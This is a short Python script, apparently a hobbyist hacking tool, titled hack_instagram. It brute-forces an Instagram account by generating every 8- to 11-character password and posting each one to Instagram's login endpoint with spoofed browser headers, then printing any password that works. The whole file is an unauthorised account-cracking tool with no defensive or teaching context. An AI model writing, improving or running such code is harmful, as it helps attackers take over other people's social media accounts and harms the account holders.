import requests
import time
import itertools
import string

def generate_passwords(length):
    chars = string.ascii_letters + string.digits + string.punctuation
    for password in itertools.product(chars, repeat=length):
        yield ''.join(password)

def hack_instagram(username):
    for length in range(8, 12):
        for password in generate_passwords(length):
            try:
                sess = requests.Session()
                sess.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                    'x-instagram-ajax': '1',
                    'X-Requested-With': 'XMLHttpRequest',
                    'origin': 'https://www.instagram.com',
                    'ContentType': 'application/x-www-form-urlencoded',
                    'Connection': 'keep-alive',
                    'Accept': '*/*',
                    'Referer': 'https://www.instagram.com',
                    'authority': 'www.instagram.com',
                    'Host': 'www.instagram.com',
                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
                    'Accept-Encoding': 'gzip, deflate'
                })

                data = {'username': username, 'password': password}
                r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
                if r.json()['authenticated']:
                    print(f'Password found: {password}')
                    return
            except requests.exceptions.RequestException as e:
                print(f'Error: {e}')
                time.sleep(1)

if __name__ == '__main__':
    username = input('Enter the username: ')
    hack_instagram(username)